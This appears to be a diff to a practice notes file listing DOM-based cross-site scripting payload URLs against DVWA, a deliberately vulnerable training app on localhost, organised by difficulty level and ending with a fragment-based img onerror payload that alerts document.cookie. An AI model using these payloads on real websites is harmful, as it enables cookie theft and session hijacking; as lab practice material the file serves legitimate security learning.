@@ -5,3 +5,6 @@ http://127.0.0.1/dvwa/vulnerabilities/xss_d/#default=<script>alert(document.cook
 [MEDIUM]
 http://127.0.0.1/dvwa/vulnerabilities/xss_d/#default=%3Cb%3E%3Cscript%3Ealert(document.location)%3C/script%3E%3C/b%3E
 http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English/option%3E%3C/select%3E%3Cimg%20src=%27x%27%20onerror=%27alert(document.cookie)%27%20/%3E
+
+[HIGH] - Using fragment section (anything after the # symbol)
+http://127.0.0.1/dvwa/vulnerabilities/xss_d/#default=English/option%3E%3C/select%3E%3Cimg%20src='x'%20onerror='alert(document.cookie)'%20/%3E
